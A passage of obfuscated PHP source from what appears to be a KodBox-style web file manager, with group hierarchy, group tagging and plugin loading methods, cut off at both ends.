groupChildrenAll($ÀÚàÚÇí) { $©œ†•  =& $_SERVER[åÄ¼Ùßš]; if (!$ÀÚàÚÇí) { return !1; } if (!is_array($ÀÚàÚÇí)) { $ÀÚàÚÇí = array($ÀÚàÚÇí); } $ĞåÜ–ô = $ÀÚàÚÇí; foreach ($ÀÚàÚÇí as $ÂÓøÃçä) { $‹ÇÔ = $this->getInfoSimple($ÂÓøÃçä); $”ı²¡„¢ = array($©œ†• [597] => array($©œ†• [471], $‹ÇÔ[$©œ†• [597]] . $ÂÓøÃçä . $©œ†• [629])); $şı¹¦·ë = $this->field($©œ†• [1428])->where($”ı²¡„¢)->select(); $ĞåÜ–ô = array_merge($ĞåÜ–ô, array_to_keyvalue($şı¹¦·ë, $©œ†• [12], $©œ†• [1428])); } return array_unique($ĞåÜ–ô); } private function _searchFromMeta($’âá»Ô…, $Ş¸ˆÖ¬Õ, $ÏÎØãŠ, $¯º²î) { $²¥Œâ·ã =& $_SERVER[åÄ¼Ùßš]; $Ş¸ˆÖ¬Õ = strtolower($Ş¸ˆÖ¬Õ); $¾Ÿ×Óƒ = array($²¥Œâ·ã[97] => $’âá»Ô…, $²¥Œâ·ã[452] => array($²¥Œâ·ã[471], "\x25{$Ş¸ˆÖ¬Õ}\x25")); $¾Ÿ×Óƒ = $this->parseWhereLike($¾Ÿ×Óƒ); if ($¯º²î) { $¾Ÿ×Óƒ[$²¥Œâ·ã[1428]] = array($²¥Œâ·ã[7], $¯º²î); } $”·Â‰øë = Model($²¥Œâ·ã[2120])->where($¾Ÿ×Óƒ)->limit($ÏÎØãŠ)->select(); if (!$”·Â‰øë) { return array(); } $”·Â‰øë = array_to_keyvalue($”·Â‰øë, $²¥Œâ·ã[12], $²¥Œâ·ã[1428]); $³†šËáŞ = $this->where(array($²¥Œâ·ã[2106] => array($²¥Œâ·ã[7], $”·Â‰øë)))->select(); if (!$³†šËáŞ) { return array(); } return $³†šËáŞ; } protected function _listDataApplyItem($Òò¡ŠŞ) { $ë³ì²ª‰ = array($Òò¡ŠŞ); $this->_listDataApply($ë³ì²ª‰); return $ë³ì²ª‰[0]; } protected function _listDataApply(&$ÎÃ¯³¬õ) { $ßñõ‘°Ö =& $_SERVER[åÄ¼Ùßš]; if (!$ÎÃ¯³¬õ) { return; } $ÙÕÉ·†† = array_to_keyvalue($ÎÃ¯³¬õ, $ßñõ‘°Ö[12], $ßñõ‘°Ö[1428]); $this->_listAppendChildren($ÎÃ¯³¬õ); $this->_listAppendChildrenMember($ÎÃ¯³¬õ); $this->_listAppendMeta($ÎÃ¯³¬õ, $ÙÕÉ·††); $this->_listAppendParent($ÎÃ¯³¬õ); $this->_listAppendSourceRoot($ÎÃ¯³¬õ, $ÙÕÉ·††); } private function _listAppendChildren(&$í†ş³•’) { $×µ‰¹Ã =& $_SERVER[åÄ¼Ùßš]; $ôÆı‡ñÚ = array_to_keyvalue($í†ş³•’, $×µ‰¹Ã[12], $×µ‰¹Ã[1428]); $ş äÓ÷Ï = array($×µ‰¹Ã[193] => array($×µ‰¹Ã[7], $ôÆı‡ñÚ)); $ç“ø¤ = array($×µ‰¹Ã[193], $×µ‰¹Ã[2121] => $×µ‰¹Ã[578]); $¸ö‹½¯ñ = $this->field($ç“ø¤)->where($ş äÓ÷Ï)->group($×µ‰¹Ã[193])->select(); $™äŸÚŞı = array_to_keyvalue($¸ö‹½¯ñ, $×µ‰¹Ã[193], $×µ‰¹Ã[578]); foreach ($í†ş³•’ as &$Î¿„ö–) { $ºÈçÇó® = $Î¿„ö–[$×µ‰¹Ã[1428]]; $Î¿„ö–[$×µ‰¹Ã[2122]] = isset($™äŸÚŞı[$ºÈçÇó®]) ? intval($™äŸÚŞı[$ºÈçÇó®]) : !1; } unset($Î¿„ö–); } private function _listAppendChildrenMember(&$Î¡·õå) { $øª£…ÚÂ =& $_SERVER[åÄ¼Ùßš]; $®Œ‘—Øš = array_to_keyvalue($Î¡·õå, $øª£…ÚÂ[12], $øª£…ÚÂ[1428]); $áå”¿½¢ = array($øª£…ÚÂ[1428] => array($øª£…ÚÂ[7], $®Œ‘—Øš)); $İîŠ‡üÌ = array($øª£…ÚÂ[1428], $øª£…ÚÂ[2121] => $øª£…ÚÂ[578]); $îŞ­‹¬¸ = Model($øª£…ÚÂ[2111])->field($İîŠ‡üÌ)->where($áå”¿½¢)->group($øª£…ÚÂ[1428])->select(); $äÂÅ‹± = array_to_keyvalue($îŞ­‹¬¸, $øª£…ÚÂ[1428], $øª£…ÚÂ[578]); foreach ($Î¡·õå as &$‹É‹Ôæ•) { $¾¼ÆÊ‹œ = $‹É‹Ôæ•[$øª£…ÚÂ[1428]]; $‹É‹Ôæ•[$øª£…ÚÂ[2123]] = isset($äÂÅ‹±[$¾¼ÆÊ‹œ]) ? intval($äÂÅ‹±[$¾¼ÆÊ‹œ]) : !1; } unset($‹É‹Ôæ•); } private function _listAppendMeta(&$‡ùœÆú, $«Á®ôœ) { $Ì³ßã‚Ş =& $_SERVER[åÄ¼Ùßš]; $ƒÇ»ºøã = array($Ì³ßã‚Ş[1428] => array($Ì³ßã‚Ş[7], $«Á®ôœ)); $Éœíàäã = Model($Ì³ßã‚Ş[2110])->where($ƒÇ»ºøã)->select(); $Éœíàäã = array_to_keyvalue_group($Éœíàäã, $Ì³ßã‚Ş[1428]); foreach ($Éœíàäã as &$Í‚µåÏ) { $Í‚µåÏ = array_to_keyvalue($Í‚µåÏ, $Ì³ßã‚Ş[97], $Ì³ßã‚Ş[452]); } unset($Í‚µåÏ); foreach ($‡ùœÆú as &$¿ÆãÎô) { $¿ÆãÎô[$Ì³ßã‚Ş[552]] = array(); if (isset($Éœíàäã[$¿ÆãÎô[$Ì³ßã‚Ş[1428]]])) { $¿ÆãÎô[$Ì³ßã‚Ş[552]] = $Éœíàäã[$¿ÆãÎô[$Ì³ßã‚Ş[1428]]]; } } unset($¿ÆãÎô); } protected function parentLevelArray($²ˆ°ı¡±) { $‰û÷ƒš =& $_SERVER[åÄ¼Ùßš]; $²ˆ°ı¡± = explode($‰û÷ƒš[50], trim($²ˆ°ı¡±, $‰û÷ƒš[50])); $²ˆ°ı¡± = array_remove_value($²ˆ°ı¡±, $‰û÷ƒš[231]); return $²ˆ°ı¡±; } protected function parentInGroup($ñÂ‚ë, $Ñ†Ğ˜‰) { $ğ³Š‹»™ =& $_SERVER[åÄ¼Ùßš]; $Ü«é€éÂ = $this->getInfoSimple($ñÂ‚ë); if (!$Ü«é€éÂ) { return !0; } $–ÍŒÏ¬¢ = $this->parentLevelArray($Ü«é€éÂ[$ğ³Š‹»™[597]]); $–ÍŒÏ¬¢[] = $ñÂ‚ë; foreach ($–ÍŒÏ¬¢ as $ñÂ‚ë) { if (in_array($ñÂ‚ë . $ğ³Š‹»™[12], $Ñ†Ğ˜‰)) { return !0; } } return !1; } private function _listAppendParent(&$ïÀáéáÈ) { $³­ç˜¶³ =& $_SERVER[åÄ¼Ùßš]; $şÖºÒù¬ = array(); foreach ($ïÀáéáÈ as &$·…°ô•) { $şÖºÒù¬[$·…°ô•[$³­ç˜¶³[1428]]] = $·…°ô•[$³­ç˜¶³[32]]; $´ü£ÄşÜ = $this->parentLevelArray($·…°ô•[$³­ç˜¶³[597]]); foreach ($´ü£ÄşÜ as $…êàÅÒ–) { if (!isset($şÖºÒù¬[$…êàÅÒ–])) { $şÖºÒù¬[$…êàÅÒ–] = 0; } } } unset($·…°ô•); foreach ($şÖºÒù¬ as $ôê»¼›å => $‡£æ“Â¶) { if ($‡£æ“Â¶) { continue; } $¯ ò… … = $this->getInfoSimple($ôê»¼›å); $şÖºÒù¬[$ôê»¼›å] = $¯ ò… …[$³­ç˜¶³[32]]; } $²éÓàã’ = $GLOBALS[$³­ç˜¶³[6]][$³­ç˜¶³[92]][$³­ç˜¶³[2124]]; if (KodUser::isRoot()) { $²éÓàã’ = !1; } foreach ($ïÀáéáÈ as &$·…°ô•) { $´ü£ÄşÜ = $this->parentLevelArray($·…°ô•[$³­ç˜¶³[597]]); $‹úøšÄˆ = $³­ç˜¶³[12]; foreach ($´ü£ÄşÜ as $ôê»¼›å => $…êàÅÒ–) { if ($²éÓàã’ && $ôê»¼›å == 0) { continue; } $‹úøšÄˆ .= $şÖºÒù¬[$…êàÅÒ–] . $³­ç˜¶³[8]; } if ($´ü£ÄşÜ) { $‹úøšÄˆ .= $·…°ô•[$³­ç˜¶³[32]]; } $·…°ô•[$³­ç˜¶³[602]] = str_replace($³­ç˜¶³[257], $³­ç˜¶³[8], $‹úøšÄˆ); } unset($·…°ô•); } private function _listAppendSourceRoot(&$ÑÂ«ÔÈ, $Ş…¨Ç½’) { $äû€’Ã =& $_SERVER[åÄ¼Ùßš]; $ÑıœÁÂÌ = Model($äû€’Ã[926])->listSourceRoot(SourceModel::TYPE_GROUP, $Ş…¨Ç½’); $ÑıœÁÂÌ = array_to_keyvalue($ÑıœÁÂÌ, $äû€’Ã[582]); $ÑıœÁÂÌ = array_remove_key($ÑıœÁÂÌ, $äû€’Ã[582]); foreach ($ÑÂ«ÔÈ as &$í¡ùÊ”Ü) { $í¡ùÊ”Ü[$äû€’Ã[90]] = $ÑıœÁÂÌ[$í¡ùÊ”Ü[$äû€’Ã[1428]]] ? $ÑıœÁÂÌ[$í¡ùÊ”Ü[$äû€’Ã[1428]]] : array(); } unset($í¡ùÊ”Ü); } protected function groupMerge($öæ¸¥ƒÉ) { $öæ¸¥ƒÉ = array_values(array_unique($öæ¸¥ƒÉ)); $¸¸¾áå¼ = array(); for ($Ø•±ş = 0; $Ø•±ş < count($öæ¸¥ƒÉ); $Ø•±ş++) { $½Õ§à¾Ù = !1; for ($ÛŒİ«• = 0; $ÛŒİ«• < count($öæ¸¥ƒÉ); $ÛŒİ«•++) { if ($Ø•±ş == $ÛŒİ«•) { continue; } if ($this->isParentOf($öæ¸¥ƒÉ[$ÛŒİ«•], $öæ¸¥ƒÉ[$Ø•±ş])) { $½Õ§à¾Ù = !0; break; } } if (!$½Õ§à¾Ù) { $¸¸¾áå¼[] = $öæ¸¥ƒÉ[$Ø•±ş]; } } return $¸¸¾áå¼; } protected function isParentOf($¯şäÍŸİ, $‡ƒÂÀ¦ ) { $„ì¶“à =& $_SERVER[åÄ¼Ùßš]; if (!$¯şäÍŸİ || !$‡ƒÂÀ¦  || $¯şäÍŸİ == $‡ƒÂÀ¦ ) { return !1; } $Ë¿Òë‚ = $this->getInfoSimple($¯şäÍŸİ); $œŞÓ›å“ = $this->getInfoSimple($‡ƒÂÀ¦ ); $‚£Ü¼ı™ = $Ë¿Òë‚[$„ì¶“à[597]] . $¯şäÍŸİ . $„ì¶“à[50]; if (substr($œŞÓ›å“[$„ì¶“à[597]], 0, strlen($‚£Ü¼ı™)) == $‚£Ü¼ı™) { return !0; } return !1; } public function groupShowRoot($™õİ¤ñ, $©”Ïá÷® = false) { $‡¥€Î£Ô =& $_SERVER[åÄ¼Ùßš]; $óƒº¡“œ = $this->getInfo($™õİ¤ñ); if (!$óƒº¡“œ) { return array(); } $Ø³Ä¨Îƒ = $this->parentLevelArray($óƒº¡“œ[$‡¥€Î£Ô[597]]); $“„öÓ„ = array($™õİ¤ñ); if (count($Ø³Ä¨Îƒ) == 0) { return $“„öÓ„; } if ($©”Ïá÷® && count($Ø³Ä¨Îƒ) == 1) { return $“„öÓ„; } if (!$óƒº¡“œ[$‡¥€Î£Ô[552]] || !isset($óƒº¡“œ[$‡¥€Î£Ô[552]][$‡¥€Î£Ô[2107]]) || $óƒº¡“œ[$‡¥€Î£Ô[552]][$‡¥€Î£Ô[2107]] == $‡¥€Î£Ô[872]) { return $this->groupShowRoot($Ø³Ä¨Îƒ[count($Ø³Ä¨Îƒ) - 1], $©”Ïá÷®); } if ($óƒº¡“œ[$‡¥€Î£Ô[552]][$‡¥€Î£Ô[2107]] == $‡¥€Î£Ô[434]) { $ƒš§‘¥Í = explode($‡¥€Î£Ô[50], $óƒº¡“œ[$‡¥€Î£Ô[552]][$‡¥€Î£Ô[2108]]); if ($ƒš§‘¥Í) { $“„öÓ„ = array_merge($“„öÓ„, $ƒš§‘¥Í); } } return $“„öÓ„; } protected function resetParentLevel() { $¬£©ı» =& $_SERVER[åÄ¼Ùßš]; $¤Öœå = $¬£©ı»[1428]; $Á– ı²¹ = $this->select(); $Á– ı²¹ = array_to_keyvalue($Á– ı²¹, $¤Öœå); foreach ($Á– ı²¹ as $Êğ¡€“Ñ) { $‹¸åÅ¹‚ = $Êğ¡€“Ñ; $âèšÈ  = array(); while ($‹¸åÅ¹‚[$¬£©ı»[193]] != 0) { $âèšÈ [] = $‹¸åÅ¹‚[$¬£©ı»[193]]; $‹¸åÅ¹‚ = $Á– ı²¹[$‹¸åÅ¹‚[$¬£©ı»[193]]]; } $âèšÈ [] = 0; $âèšÈ  = $¬£©ı»[50] . implode($¬£©ı»[50], array_reverse($âèšÈ )) . $¬£©ı»[50]; $this->setNamePinyin($Êğ¡€“Ñ[$¤Öœå], $Êğ¡€“Ñ[$¬£©ı»[32]]); $this->where(array($¤Öœå => $Êğ¡€“Ñ[$¤Öœå]))->save(array($¬£©ı»[668] => $âèšÈ )); } return $Á– ı²¹; } public function groupNameAuto($ŞÜ¨¥×”, $ñäÓãˆş) { $ö¬óÑ¹ =& $_SERVER[åÄ¼Ùßš]; $±á‘«è = $this->where(array($ö¬óÑ¹[489] => $ŞÜ¨¥×”))->getField($ö¬óÑ¹[32], !0); if (!$±á‘«è || !in_array($ñäÓãˆş, $±á‘«è)) { return $ñäÓãˆş; } for ($“÷ù¬ø¨ = 1; $“÷ù¬ø¨ <= count($±á‘«è) + 1; $“÷ù¬ø¨++) { $êå’ôŞ› = $ñäÓãˆş . "\x28{$“÷ù¬ø¨}\x29"; if (!in_array($êå’ôŞ›, $±á‘«è)) { return $êå’ôŞ›; } } } public function groupSwitch($ş€ò‚à«, $üÀ°ÒÇÍ) { $Ù°„èÂØ =& $_SERVER[åÄ¼Ùßš]; $©•ôşÓ© = array($Ù°„èÂØ[1428] => array($Ù°„èÂØ[7], array($ş€ò‚à«, $üÀ°ÒÇÍ))); $ãäÊç¯â = $this->where($©•ôşÓ©)->select(); $ãäÊç¯â = array_to_keyvalue($ãäÊç¯â, $Ù°„èÂØ[1428]); $ˆüÙ¿î = _get($ãäÊç¯â, $ş€ò‚à«); $Ù¬Ç±‚å = _get($ãäÊç¯â, $üÀ°ÒÇÍ); if (!$ˆüÙ¿î || !$Ù¬Ç±‚å || $ˆüÙ¿î[$Ù°„èÂØ[193]] == 0) { return !1; } if ($ˆüÙ¿î[$Ù°„èÂØ[1428]] == $Ù¬Ç±‚å[$Ù°„èÂØ[1428]]) { return !1; } if (strpos($Ù¬Ç±‚å[$Ù°„èÂØ[597]], $ˆüÙ¿î[$Ù°„èÂØ[597]] . $ˆüÙ¿î[$Ù°„èÂØ[1428]] . $Ù°„èÂØ[50]) === 0) { return !1; } $©•ôşÓ© = array($Ù°„èÂØ[1428] => $ş€ò‚à«); $òİÌØ³© = Model($Ù°„èÂØ[2111])->where($©•ôşÓ©)->select(); if (!$òİÌØ³©) { $òİÌØ³© = array(); } foreach ($òİÌØ³© as $…ûõ°ŠÂ) { $Î°å¯û¤ = $…ûõ°ŠÂ[$Ù°„èÂØ[1817]]; $©•ôşÓ© = array($Ù°„èÂØ[1817] => $Î°å¯û¤, $Ù°„èÂØ[1428] => $üÀ°ÒÇÍ); $ä«“ğ»ò = Model($Ù°„èÂØ[2111])->where($©•ôşÓ©)->find(); if (!$ä«“ğ»ò) { $³ãáÆÈğ = array($üÀ°ÒÇÍ => $…ûõ°ŠÂ[$Ù°„èÂØ[2125]]); Model($Ù°„èÂØ[610])->userGroupAdd($Î°å¯û¤, $³ãáÆÈğ); } Model($Ù°„èÂØ[610])->userGroupRemove($Î°å¯û¤, $ş€ò‚à«); } $©•ôşÓ© = array($Ù°„èÂØ[191] => 2, $Ù°„èÂØ[193] => 0, $Ù°„èÂØ[497] => 1, $Ù°„èÂØ[582] => array($Ù°„èÂØ[7], array($ş€ò‚à«, $üÀ°ÒÇÍ))); $˜ºüƒªÀ = Model($Ù°„èÂØ[926])->where($©•ôşÓ©)->field($Ù°„èÂØ[2126])->select(); $˜ºüƒªÀ = array_to_keyvalue($˜ºüƒªÀ, $Ù°„èÂØ[582], $Ù°„èÂØ[194]); $–©ì‰° = !empty($˜ºüƒªÀ[$ş€ò‚à«]) ? $˜ºüƒªÀ[$ş€ò‚à«] : !1; if ($–©ì‰°) { if (!$˜ºüƒªÀ[$üÀ°ÒÇÍ]) { $˜ºüƒªÀ[$üÀ°ÒÇÍ] = Model($Ù°„èÂØ[926])->groupRootAdd($üÀ°ÒÇÍ); } $ãŒ‘§Şñ = $˜ºüƒªÀ[$üÀ°ÒÇÍ]; $©•ôşÓ© = array($Ù°„èÂØ[193] => $–©ì‰°); $˜ºüƒªÀ = Model($Ù°„èÂØ[926])->where($©•ôşÓ©)->field($Ù°„èÂØ[2127])->select(); if (!$˜ºüƒªÀ) { $˜ºüƒªÀ = array(); } Model($Ù°„èÂØ[926])->moveClearAuth = !1; foreach ($˜ºüƒªÀ as $©®Ø†»¸) { $À½èš‘­ = $©®Ø†»¸[$Ù°„èÂØ[497]] == $Ù°„èÂØ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ù°„èÂØ[926])->move($©®Ø†»¸[$Ù°„èÂØ[194]], $ãŒ‘§Şñ, $À½èš‘­); } Model($Ù°„èÂØ[926])->moveClearAuth = !0; $©•ôşÓ© = array($Ù°„èÂØ[191] => 2, $Ù°„èÂØ[582] => $ş€ò‚à«); $Ñ¹ÃäáÄ = array($Ù°„èÂØ[582] => $üÀ°ÒÇÍ); Model($Ù°„èÂØ[2128])->where($©•ôşÓ©)->save($Ñ¹ÃäáÄ); Model($Ù°„èÂØ[2129])->where($©•ôşÓ©)->save($Ñ¹ÃäáÄ); } $this->_changeChildLevel($ãäÊç¯â[$ş€ò‚à«], $ãäÊç¯â[$üÀ°ÒÇÍ], !0); $this->where(array($Ù°„èÂØ[193] => $ş€ò‚à«))->save(array($Ù°„èÂØ[193] => $üÀ°ÒÇÍ)); $this->_clearChildrenCache($ãäÊç¯â[$üÀ°ÒÇÍ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($éÚ¶¸) { $¯Šææ½ğ =& $_SERVER[åÄ¼Ùßš]; return array($¯Šææ½ğ[2130] => array($éÚ¶¸[0], $¯Šææ½ğ[2131]), $¯Šææ½ğ[2132] => array($éÚ¶¸[0], $¯Šææ½ğ[2133])); } protected function get($Ş‹‡ªÏƒ) { $¢Ùã³ñ =& $_SERVER[åÄ¼Ùßš]; $¥ˆ²ğıƒ = Model($¢Ùã³ñ[598])->metaGet($Ş‹‡ªÏƒ, $¢Ùã³ñ[2134]); $ı§™ğê = json_decode($¥ˆ²ğıƒ, !0); return $ı§™ğê ? $ı§™ğê : array($¢Ùã³ñ[2135] => $¢Ùã³ñ[91], $¢Ùã³ñ[447] => array()); } protected function set($ÄŒÁ¤ØĞ, $üÂÊ™©×) { $ì±µû† =& $_SERVER[åÄ¼Ùßš]; $üÂÊ™©× = $üÂÊ™©× ? $üÂÊ™©× : array($ì±µû†[2135] => $ì±µû†[91], $ì±µû†[447] => array()); return Model($ì±µû†[598])->metaSet($ÄŒÁ¤ØĞ, $ì±µû†[2134], json_encode($üÂÊ™©×)); } protected function getByTagID($æ”‚Á‰¨, $Ğ›Ñ•Û) { $ÓÔ˜ÔÙı =& $_SERVER[åÄ¼Ùßš]; if (!$æ”‚Á‰¨ || !$Ğ›Ñ•Û) { return !1; } if (!Model($ÓÔ˜ÔÙı[598])->getInfoSimple($æ”‚Á‰¨)) { return !1; } $¿¾ Ø± = $this->get($æ”‚Á‰¨); if (!$¿¾ Ø± || !isset($¿¾ Ø±[$ÓÔ˜ÔÙı[447]])) { return !1; } $ÁÛ¥—‘× = array_find_by_field($¿¾ Ø±[$ÓÔ˜ÔÙı[447]], $ÓÔ˜ÔÙı[484], $Ğ›Ñ•Û); return is_array($ÁÛ¥—‘×) ? $ÁÛ¥—‘× : !1; } public function listSource($Ÿõ®Èó¾, $²˜¥¤ñÏ) { $ô·Ëµ†˜ =& $_SERVER[åÄ¼Ùßš]; if ($²˜¥¤ñÏ && !is_array($²˜¥¤ñÏ)) { $²˜¥¤ñÏ = array($²˜¥¤ñÏ); } $°Ë³Áñã = $this->listData($Ÿõ®Èó¾); $ì¨“°õ± = array(); foreach ($°Ë³Áñã as $¶õõ´¤ª) { $¤áËêà¿ = $¶õõ´¤ª[$ô·Ëµ†˜[87]]; if (!$¤áËêà¿) { continue; } if (!isset($ì¨“°õ±[$¤áËêà¿])) { $ì¨“°õ±[$¤áËêà¿] = array(); } $ì¨“°õ±[$¤áËêà¿][] = $¶õõ´¤ª[$ô·Ëµ†˜[512]]; } $«êÜúÌ÷ = array(); foreach ($ì¨“°õ± as $èÅñßÑµ => $Ï€üŠİœ) { $£í™™­Ò = !0; if (!$²˜¥¤ñÏ) { $«êÜúÌ÷[] = $èÅñßÑµ; continue; } foreach ($²˜¥¤ñÏ as $àŠÚ•Øß) { if (!in_array($àŠÚ•Øß, $Ï€üŠİœ)) { $£í™™­Ò = !1; break; } } if ($£í™™­Ò) { $«êÜúÌ÷[] = $èÅñßÑµ; } } if (!$«êÜúÌ÷) { return array(); } $”ê¬ñÂŸ = array($ô·Ëµ†˜[503] => array($ô·Ëµ†˜[504], $«êÜúÌ÷), $ô·Ëµ†˜[582] => $Ÿõ®Èó¾, $ô·Ëµ†˜[191] => SourceModel::TYPE_GROUP); $¤È˜¶ã» = Model($ô·Ëµ†˜[1466])->listSource($”ê¬ñÂŸ); if (!$¤È˜¶ã» || count($«êÜúÌ÷) == $¤È˜¶ã»[$ô·Ëµ†˜[444]][$ô·Ëµ†˜[445]]) { return $¤È˜¶ã»; } $•¡¼Ã† = array(); $¶Œ©Û°£ = array_to_keyvalue($¤È˜¶ã»[$ô·Ëµ†˜[85]], $ô·Ëµ†˜[12], $ô·Ëµ†˜[194]); $¤Ò®ÄŞ÷ = array_to_keyvalue($¤È˜¶ã»[$ô·Ëµ†˜[86]], $ô·Ëµ†˜[12], $ô·Ëµ†˜[194]); $µÛµŸ¢ = array_merge($¤Ò®ÄŞ÷, $¶Œ©Û°£); foreach ($«êÜúÌ÷ as $¤áËêà¿) { if (!in_array($¤áËêà¿, $µÛµŸ¢)) { $•¡¼Ã†[] = $¤áËêà¿; } } if ($•¡¼Ã†) { $this->removeBySource($Ÿõ®Èó¾, $•¡¼Ã†); } return $¤È˜¶ã»; } protected function listData($šõçŸŸÉ) { $íÑ½€ÎÆ =& $_SERVER[åÄ¼Ùßš]; $óåüš­ò = array($íÑ½€ÎÆ[1808] => 0, $íÑ½€ÎÆ[570] => array($íÑ½€ÎÆ[2136], 0), $íÑ½€ÎÆ[508] => $íÑ½€ÎÆ[1424] . $šõçŸŸÉ); $£¼÷Ç ® = $íÑ½€ÎÆ[2137]; $åÊÆ²ËÀ = $this->field($£¼÷Ç ®)->where($óåüš­ò)->order($íÑ½€ÎÆ[2138])->select(); return $åÊÆ²ËÀ ? $åÊÆ²ËÀ : array(); } protected function addToTag($ß¥óŒ•…, $¬Ñ², $³ø¹¾ Ë) { $¡«˜Õ¤Å =& $_SERVER[åÄ¼Ùßš]; if (!$this->getByTagID($ß¥óŒ•…, $³ø¹¾ Ë) || !$¬Ñ²) { return !1; } if (!Model($¡«˜Õ¤Å[926])->pathInfo($¬Ñ²)) { return !1; } $Ş‘¼Êç÷ = array($¡«˜Õ¤Å[1808] => 0, $¡«˜Õ¤Å[570] => $³ø¹¾ Ë, $¡«˜Õ¤Å[507] => $¬Ñ², $¡«˜Õ¤Å[508] => $¡«˜Õ¤Å[2139] . $ß¥óŒ•…, $¡«˜Õ¤Å[506] => $¡«˜Õ¤Å[12], $¡«˜Õ¤Å[2021] => 0); if ($this->where($Ş‘¼Êç÷)->find()) { return !1; } return $this->add($Ş‘¼Êç÷); } protected function removeFromTag($¾¸‰Í‰Š, $¿éÒ»·‚, $—ïò²Æ¾) { $ÇğºÔ¡Ô =& $_SERVER[åÄ¼Ùßš]; if (!$this->getByTagID($¾¸‰Í‰Š, $—ïò²Æ¾) || !$¿éÒ»·‚) { return !1; } if (is_array($¿éÒ»·‚)) { $¿éÒ»·‚ = array($ÇğºÔ¡Ô[7], $¿éÒ»·‚); } $ı­Ûõ = array($ÇğºÔ¡Ô[1808] => 0, $ÇğºÔ¡Ô[570] => $—ïò²Æ¾, $ÇğºÔ¡Ô[508] => $ÇğºÔ¡Ô[2139] . $¾¸‰Í‰Š, $ÇğºÔ¡Ô[507] => $¿éÒ»·‚); return $this->where($ı­Ûõ)->delete(); } protected function removeByTag($ùìÛÒñ¸, $¨¹ÕñÏ©) { $õ§¿ñ­è =& $_SERVER[åÄ¼Ùßš]; if (!$this->getByTagID($ùìÛÒñ¸, $¨¹ÕñÏ©)) { return !1; } $Ïµ­ØÙ = array($õ§¿ñ­è[1808] => 0, $õ§¿ñ­è[570] => $¨¹ÕñÏ©, $õ§¿ñ­è[508] => $õ§¿ñ­è[2139] . $ùìÛÒñ¸); return $this->where($Ïµ­ØÙ)->delete(); } protected function removeBySource($¿µÈûüÏ, $È²ÈÊŒŸ) { $ëØ–»Ñ =& $_SERVER[åÄ¼Ùßš]; if (!$¿µÈûüÏ || !$È²ÈÊŒŸ) { return !1; } if (is_array($È²ÈÊŒŸ)) { $È²ÈÊŒŸ = array($ëØ–»Ñ[7], $È²ÈÊŒŸ); } $¨š‡Ë½š = array($ëØ–»Ñ[1808] => 0, $ëØ–»Ñ[507] => $È²ÈÊŒŸ, $ëØ–»Ñ[570] => array($ëØ–»Ñ[1122], 0), $ëØ–»Ñ[508] => $ëØ–»Ñ[2139] . $¿µÈûüÏ); return $this->where($¨š‡Ë½š)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x70\154\x75\147\x69\156\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\163\x74\x61\x74\165\x73", "\x72\x65\x67\151\145\x73\x74", "\143\x6f\156\x66\x69\x67"); public function loadList($³İ–¯¨× = false) { $øè¬¤ª = array_to_keyvalue($this->listData(), $_SERVER[åÄ¼Ùßš][32]); if ($³İ–¯¨×) { return $øè¬¤ª[$³İ–¯¨×]; } return $øè¬¤ª; } public function init() { $“µú‚¿ =& $_SERVER[åÄ¼Ùßš]; Hook::trigger($“µú‚¿[2140]); $„£ÈĞœÁ = $this->loadPluginList(); foreach ($„£ÈĞœÁ as $Ö­Ì¼ => $›Ë’ÈÏ) { $É¶ùåŞ€ = $this->appAllow($Ö­Ì¼, $›Ë’ÈÏ); if (!$É¶ùåŞ€) { continue; } foreach ($›Ë’ÈÏ[$“µú‚¿[2141]] as $–Ÿ½ß» => $€»ºÄ“´) { Hook::bind($–Ÿ½ß», $€»ºÄ“´); } } Hook::trigger($“µú‚¿[2142]); Hook::trigger(ACTION); } public function appAllow($æ¡ÁËÖ, $ÄÕÏÆ•Ù, $…íí©Ö = true) { $î‹”šã =& $_SERVER[åÄ¼Ùßš]; $ûİˆ»ç® = PLUGIN_DIR . $æ¡ÁËÖ . $î‹”šã[2143]; if (!is_array($ÄÕÏÆ•Ù) || !is_array($ÄÕÏÆ•Ù[$î‹”šã[2141]]) || $ÄÕÏÆ•Ù[$î‹”šã[843]] != 1 || !is_file($ûİˆ»ç®)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$î‹”šã[6]][$î‹”šã[2144]] || !$GLOBALS[$î‹”šã[6]][$î‹”šã[2145]]) { return !0; } $¶¦Úš› = explode($î‹”šã[50], strtolower($GLOBALS[$î‹”šã[6]][$î‹”šã[2145]])); return in_array(strtolower($æ¡ÁËÖ), $¶¦Úš›) ? !1 : !0; } if ($…íí©Ö && !Action($î‹”šã[2146])->checkAuth($æ¡ÁËÖ)) { return !1; } return !0; } public function unInstall($Ùš”®Ö) { $œàåâÑí =& $_SERVER[åÄ¼Ùßš]; $¥ìŒº¯Ş = $this->loadList($Ùš”®Ö); if (file_exists(PLUGIN_DIR . $Ùš”®Ö)) { Hook::apply($Ùš”®Ö . $œàåâÑí[2147]); } $this->remove($¥ìŒº¯Ş[$œàåâÑí[484]]); } public function changeStatus($šÏÕ–õò, $¾ûøÀöÈ) { $ú¯÷áĞ– =& $_SERVER[åÄ¼Ùßš]; $–‰³´»ò = $this->loadList($šÏÕ–õò); if ($¾ûøÀöÈ) { Hook::apply($šÏÕ–õò . $ú¯÷áĞ–[2148]); } $this->update($–‰³´»ò[$ú¯÷áĞ–[484]], array($ú¯÷áĞ–[2149] => $¾ûøÀöÈ)); } public function appRegist($ÁÄë®±Ö, $º½œâÙ ) { $ûˆ»æ˜¸ =& $_SERVER[åÄ¼Ùßš]; $Èô¥Ñ¤ = $this->loadList($ÁÄë®±Ö); if ($Èô¥Ñ¤) { $this->update($Èô¥Ñ¤[$ûˆ»æ˜¸[484]], array($ûˆ»æ˜¸[2141] => $º½œâÙ )); } else { $ÏÂÓ½ş = array($ûˆ»æ˜¸[32] => $ÁÄë®±Ö, $ûˆ»æ˜¸[2141] => $º½œâÙ , $ûˆ»æ˜¸[843] => 0, $ûˆ»æ˜¸[6] => $this->getConfigDefault($ÁÄë®±Ö)); $this->insert($ÏÂÓ½ş); } } public function getConfigDefault($˜ËÏ†¯) { $÷®§š½Î =& $_SERVER[åÄ¼Ùßš]; $ÈàÉß‡» = array(); $Úõ¬ú µ = $this->getPackageJson($˜ËÏ†¯); if (!$Úõ¬ú µ && is_array($Úõ¬ú 